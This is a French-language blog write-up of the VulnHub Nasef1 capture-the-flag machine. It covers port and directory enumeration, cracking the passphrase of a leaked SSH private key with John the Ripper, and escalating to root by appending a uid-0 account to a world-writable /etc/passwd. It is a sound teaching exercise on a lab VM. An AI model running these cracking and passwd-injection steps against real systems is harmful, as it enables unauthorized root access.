---
title: Solution du CTF Nasef1 - Locating Target de VulnHub
tags: [CTF, VulnHub]
---

### Don't

[Nasef1: Locating Target](https://vulnhub.com/entry/nasef1-locating-target,640/) est un vieux CTF de VulnHub. Je dis "vieux" car le site n'est plus entretenu depuis un moment, le groupe semblant préférer proposer [des images docker de vulnérabilités](https://github.com/vulhub/vulhub).

On trouve sur ce CTF les services les plus communs :

```console
$ sudo nmap  -p- -T5 192.168.242.139
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.242.139
Host is up (0.0019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:BD:21:5C (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.35 seconds
```

Le site Internet ne livrant que la page par défaut d'Apache, il nous faut énumérer.

Ce que j'ai fait longuement à grand renfort de plusieurs wordlists et de liste d'extensions. Finalement c'est tombé

```console
$ feroxbuster -u http://192.168.242.139/ -w DirBuster-0.12/directory-list-2.3-big.txt -n -x php,html,txt,zip

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.242.139/
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php, html, txt, zip]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      375l      964w    10918c http://192.168.242.139/index.html
403        9l       28w      280c http://192.168.242.139/server-status
200       44l       54w     2571c http://192.168.242.139/goodmath.txt
403        9l       28w      280c http://192.168.242.139/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html
[####################] - 16m  6367810/6367810 0s      found:4       errors:598    
[####################] - 15m  6367810/6367810 6637/s  http://192.168.242.139/
```

Si vous décidez de créer votre propre CTF, ne faites pas ça ! Quel est l'intérêt pédagogique d'utiliser un path quasiment impossible à deviner ?

La commande pour lancer l'énumération sera toujours la même. Il ne faut pas plus de compétences pour choisir une wordlist plutôt qu'une autre, alors tenez vous en aux classiques que tout le monde dispose.

Le fichier en question contient une clé SSH privée, protégée par une passphrase :

```
-----BEGIN RSA PRIVATE KEY-----                                                                                        
Proc-Type: 4,ENCRYPTED                                                                                                 
DEK-Info: AES-128-CBC,6A4D21879E90C5E2F448418E600FE270                                                                 
                                                                                                                       
SKmxpzNbs+SKc70z6jNDHLoG6OH/E/ehh6f80/y+/LysnliEYuid1/hSHXPd8CZc                                                       
LhbRLtGXIXkxxwel8bJ1CRpo0PilIVABbk4L5jSeZW3DZVuuY3Do3yv+9xmd/Pm7                                                       
RJQVgdh5E1cFL1HwAa4Gz1hs+YW2dKR1aPXulEuobt6KFUfVseyW6Gv3za/cD6J+                                                       
DQ0XAU/S9oLMH75/0Kgfxk6U61UOQu4FpeqeXJkVyeqYrKIcwA31xUemLEHIEYe5                                                       
EW0T06lYcHU88JnPtMy1K8DkvNd/x8GdgmGPzkdZeyDuueYuTu7dCrs8FMSum/ns                                                       
oW0KjM0nH+Xyhcri9Q0nHgj8fCkmleic2aey1SCa7CGXUC0hJOCw+rO9c+NG9m6H                                                       
Dcy9NHc9ww9IN+MxKE9y6XFd7Kl24klGcQVH2oXF99sbYvbJI/fZZprOuAKZjtl8                                                       
ZFvlS4sRbP3rhSOTWe9de8TziCv4/xOK4IJNw6wchZPv+io/Izk/bHkJpn7WwzPS                                                       
hJ9Mxlec8oiTwhjEde58+qMrlf0qjtXGgfB6U9bE6noSQn2YZhE6Wc/C9M74Sdu/                                                       
XLvO8kd5Yy0hzWJVFaHLmUr6wO4h0XZmsJrBeHbrz1T6ezXtHH0/A1tfjTwzC+Q5                                                       
tyqC7PW7+d4T6Ay8oZtThmqhgA9bqYPCGyvMEYRfuTlmrNBecCrOYi544kUyADvv                                                       
IWUoVFIY1xAU8tV46ztX6JeVWt1AKFpFScnXwY6kJYuLLErTBWSjZLW/fuakVaUg                                                       
krlYHLKTJ+8FyjmxVi/qbz45bxn5fu9ApZqVRhTdqCEqlJNsjo9jfm/nrv29h3C6                                                       
v8HXBju8Dx+8DmFgzJOkxvt/QLn5w0vcnOqpAETwQk9b7ByqrwLLBEHCu3qyZ8l4                                                       
eNpwJXMobJiG0vfNO75BQD2l1Y24/oHdxUiOW5jSd/kTMdNwqf+AbcFrKWkHBOcg                                                       
7GO2MrBQh/klWrj+aSr5tHl9+YaaFit50/3SzY5BH/W02acMTSQnbm0fct5kIk+S                                                       
b2JU5okKlCtyjrZ9VAGP4b9tWU4sPlRH0y+T3RO5FldoeJx1/E/o7LgcoTj43wgQ                                                       
cxqrGcKuzCA4ZXg/Iazas3mbqR1YaajVnzaeCIxqj7yGCUPuBlRYg9IuGJZogozK                                                       
TKS/U8xqHVRt5gCpeY0keNQE54PCEUT5/gdymvXPS52xLjVYOJq5EJ2rNVNfoiz+                                                       
C9CpFutEg0878GUAY6ZFOI5nV6VfnNVGfhSxEhjlk72JN0X16nnyMCcSY06ZcEhH                                                       
LnnvRL64zM5vSUbCzVjze40TISdYusm21fMcPK/G3ZsrdP3/7StHxJfdtfA0GyAf                                                       
NXSo9XfZ9aLc5n5I2gOnSWRSRXMrF4ORJHjMw8UCh5fj2U5Ahg8SVfMzsi5K3rLA                                                       
JDpr+5HypFX+hyVI+dTJe/kqu0KtKPiOYaKJo3/OVZMAkLqJMPnU17K/ifEw8/ez                                                       
B3Ndl7SIeQKNCGwo+JDtxDbrkqX8Hbjvdpo5szTsZSPX2bboq6vCPTK7rX9Ebe62                                                       
d0S9S/SbKlAw3CPRcbg3qXbKrsNhUxekzvIfMkZ4f86xDcnQh/7Q3EyDr1SQyAIQ                                                       
V9BGF6B6zMnQiY7Y6Ix8macVELQ3I6fxkTun+h64mz51sbw8QHuSoYRzCnPg8Uey                                                       
xLYGqyL3/0XNkp+na8DVFNtelgaROYqHqRr4bNen07p04U0IOkJm7BrYBBSNLTd+                                                       
7ABuE1iDNOe/wroB9Mzi+DcvTlr5qd+XgsoQZfF5oyrB4OcPtsghuT40zl/4rVAL                                                       
8l0eC2P0m28+r7w6gYniQb8crAVB+Zzqzr+s9yOIlVQsiv0WZNOcCDmMEVHG0gKm                                                       
A9sl6Mf/6fHzUY/12ygMIs1cV4maRvTmaIWb1VkAEmleXWa00+jxgB2uGomGHC2G                                                       
C4o/jH7gNorznCEzDjRoE2n2R9dSuiKD5r6DwSgnfulFXL51NP+Br818plyyYusK                                                       
km1HHdz7y/0FdFs5zmeQ4Bj6eq1mXueiYeCIvGWmKlWQKNMKYQYR61PJ7nbtk8SD                                                       
3XcvDNUUBSW6UyhDJuPom0q6r1rStKQfa9RShQeUawtfWgU8ZA3DRGh1xP/Co3Z4                                                       
qwb7nlc6yqiOfp1csOGD/HVVmptfLs2WFWnRjLHruk9VleXWtocLxG1cW4S4Fr8g                                                       
+0KbPPZ5ZANo1MSqTABym6BxSjp4Cf+p5kKu4U7X32poyAeyHg4vr1FfCtkBynvv                                                       
ge7MV2WjoApSPSg0UH4rWaLD+/jtvd0trP8+TN6nm3JOET4kxSXr439Rvnjbhz41                                                       
hZBywbVQovhmJWYkR7IS3e8FAAWjRCdT64GcoqVXKXzZhnojolL4lq10eDsGoMY4                                                       
-----END RSA PRIVATE KEY-----                                                                                          
                                                                                                                       
Here is your key agentr
```

Il faut d'abord obtenir un hash qu'on passera à JtR :

```bash
python3 ssh2john.py /tmp/goodmath.txt
```

Retrouver le pass est rapide :

```console
$ john --wordlist=wordlists/rockyou.txt /tmp/hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
reading          (/tmp/goodmath.txt)     
1g 0:00:00:00 DONE (2025-06-27 13:00) 5.000g/s 15040p/s 15040c/s 15040C/s lance..colton
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Tout ça pour ça

Une fois connecté, direction le flag :

```console
agentr@nasef1:~$ uname -a
Linux nasef1 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
agentr@nasef1:~$ id
uid=1001(agentr) gid=1001(agentr) groups=1001(agentr)
agentr@nasef1:~$ ls -al
total 40
drwxr-xr-x 5 agentr agentr 4096 Dec 24  2020 .
drwxr-xr-x 3 root   root   4096 Dec 24  2020 ..
-rw------- 1 agentr agentr   37 Dec 24  2020 .bash_history
-rw-r--r-- 1 agentr agentr  220 Dec 24  2020 .bash_logout
-rw-r--r-- 1 agentr agentr 3771 Dec 24  2020 .bashrc
drwx------ 2 agentr agentr 4096 Dec 24  2020 .cache
drwxrwxr-x 3 agentr agentr 4096 Dec 24  2020 .local
-rw-r--r-- 1 agentr agentr  807 Dec 24  2020 .profile
drwx------ 2 agentr agentr 4096 Dec 24  2020 .ssh
-rw-rw---- 1 agentr agentr  118 Dec 24  2020 user.txt
agentr@nasef1:~$ cat user.txt 
[Arabic]
الإحداثيات الأولى هي 25 درجة شمالا

[English]
The First coordinate is 25.0000° N
```

Une poignée de commandes d'énumération plus tard j'ai ce qu'il me faut :

```console
agentr@nasef1:~$ find / -user root -writable -type f 2> /dev/null  | grep -v /proc
/etc/passwd
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
--- snip ---
```

Le fichier `passwd` est modifiable, je rajoute donc un compte privilégié :

```console
agentr@nasef1:~$ ls -al /etc/passwd
-rw-r--rw- 1 root root 1763 Dec 24  2020 /etc/passwd
agentr@nasef1:~$ echo devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh >> /etc/passwd
agentr@nasef1:~$ su devloop
Password: 
# cd /root
# ls
root.txt  snap
# cat root.txt  
[ARABIC]
الإحداثيات الثانية هي 71 درجة غربا


[ENGLISH]
The Second coordinate is 71.0000° W
```

Laisser tourner l'énumération web a pris plus de temps que tout le reste. Une perte de temps !

Thanks, no thanks.
